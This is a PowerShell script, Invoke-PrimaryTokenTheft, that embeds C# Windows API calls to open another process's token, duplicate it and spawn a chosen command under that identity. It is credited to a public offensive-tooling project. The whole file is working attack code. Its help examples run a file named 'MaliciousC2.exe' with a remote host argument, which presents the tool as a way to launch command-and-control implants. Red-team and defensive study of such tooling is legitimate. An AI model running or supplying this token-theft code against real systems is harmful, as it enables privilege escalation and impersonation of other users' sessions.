function Invoke-PrimaryTokenTheft
{
<#
.SYNOPSIS
This is a simple PowerShell function to steal a primary token and spawn a command of your choosing.

.DESCRIPTION
This is a simple PowerShell function to steal a primary token and spawn a command of your choosing.

This was derived almost completely from https://github.com/slyd0g/PrimaryTokenTheft/

.PARAMETER ProcID
Process ID whose token you wish to use.

.PARAMETER Command
Command you want to run with the stolen token.

.PARAMETER Arguments
Arguments to pass to the command you wish to run with the stolen token.

.EXAMPLE

PS > Invoke-PrimaryTokenTheft -ProcID 1234

Use above command to spawn a new command window with the token of process ID 1234.

.EXAMPLE

PS > Invoke-PrimaryTokenTheft -ProcID 1234 -Command MaliciousC2.exe

Use above command to run MaliciousC2.exe with the token of process ID 1234.

.EXAMPLE

PS > Invoke-PrimaryTokenTheft -ProcID 1234 -Command MaliciousC2.exe -Arguments "/s 192.168.1.1"

Use above command to run MaliciousC2.exe, passing arguments "/s 192.168.1.1", with the token of process ID 1234.

.LINK
https://github.com/reigningshells

#>
	[CmdletBinding()]
	param (
	
		[Parameter(Mandatory = $True)]
		[int]$ProcID,

		[Parameter(Mandatory = $False)]
		[String]$Command = "C:\Windows\System32\cmd.exe",

		[Parameter(Mandatory = $False)]
		[String]$Arguments = $null
	)

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
		public int nLength;
		public IntPtr lpSecurityDescriptor;
		public int bInheritHandle;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public Int32 cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public Int32 dwX;
		public Int32 dwY;
		public Int32 dwXSize;
		public Int32 dwYSize;
		public Int32 dwXCountChars;
		public Int32 dwYCountChars;
		public Int32 dwFillAttribute;
		public Int32 dwFlags;
		public Int16 wShowWindow;
		public Int16 cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public int dwProcessId;
		public int dwThreadId;
	}
	
	public static class Advapi32
	{
		[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]		
		public static extern bool OpenProcessToken(		
			IntPtr ProcessHandle, 		
			uint DesiredAccess,		
			out IntPtr TokenHandle);

		[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
		public static extern bool DuplicateTokenEx(
			IntPtr hExistingToken,
			uint dwDesiredAccess,
			ref SECURITY_ATTRIBUTES lpTokenAttributes,
			int ImpersonationLevel,
			int TokenType,
			ref IntPtr phNewToken);

		[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
		public static extern bool CreateProcessWithTokenW(
			IntPtr hToken, 
			UInt32 dwLogonFlags, 
			IntPtr lpApplicationName, 
			IntPtr lpCommandLine, 
			UInt32 dwCreationFlags, 
			IntPtr lpEnvironment, 
			IntPtr lpCurrentDirectory, 
			[In] ref STARTUPINFO lpStartupInfo, 
			out PROCESS_INFORMATION lpProcessInformation);
	}

	public static class Kernel32
	{

		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr OpenProcess(
			UInt32 processAccess,
			bool bInheritHandle,
			UInt32 processId);

		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern uint GetLastError();
	}

"@
		
	$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
	
	# Needs Admin privs
	if (!$IsAdmin) {
		Write-Output "`n[!] Administrator privileges are required!`n"
		Return
	}

	[System.Diagnostics.Process]::EnterDebugMode()

	$tokenHandle = [IntPtr]::Zero
	$duplicateTokenHandle = [IntPtr]::Zero
	$pi = New-Object PROCESS_INFORMATION
	$si = New-Object STARTUPINFO

	$processHandle = [Kernel32]::OpenProcess(0x400, $true, $ProcID)

	# TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY
	# 0x02 | 0x01 | 0x08 = 0x0B
	if([Advapi32]::OpenProcessToken($processHandle, 0x0B, [ref]$tokenHandle))
	{
		Write-Output "[+] OpenProcessToken() success!"
	}
	else
	{
		$errorCode = [Kernel32]::GetLastError()
		Write-Output "[-] OpenProcessToken() Error: $errorCode"
		exit 1
	}

	# TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY
	# 0x80 | 0x100 | 0x08 | 0x02 | 0x01 = 0x18B
	$SECURITY_ATTRIBUTES = New-Object SECURITY_ATTRIBUTES
	if([Advapi32]::DuplicateTokenEx($tokenHandle, 0x18B, [ref] $SECURITY_ATTRIBUTES, 2, 1, [ref] $duplicateTokenHandle))
	{
		Write-Output "[+] DuplicateTokenEx() success!"
	}
	else
	{
		$errorCode = [Kernel32]::GetLastError()
		Write-Output "[-] DuplicateTokenEx() Error: $errorCode"
		exit 1
	}

	$applicationName = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("$Command")
	if($Arguments -eq $null)
	{
		$commandLine = [IntPtr]::Zero
	}
	else
	{
		$commandLine = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("$Arguments")
	}

	if([Advapi32]::CreateProcessWithTokenW($duplicateTokenHandle, 0x00000001, $applicationName, $commandLine, 0, [IntPtr]::Zero, [IntPtr]::Zero, [ref] $si, [ref] $pi))
	{
		Write-Output "[+] Process spawned!"
	}
	else
	{
		$errorCode = [Kernel32]::GetLastError()
		Write-Output "[-] CreateProcessWithTokenW() Error: $errorCode"
		exit 1
	}
}
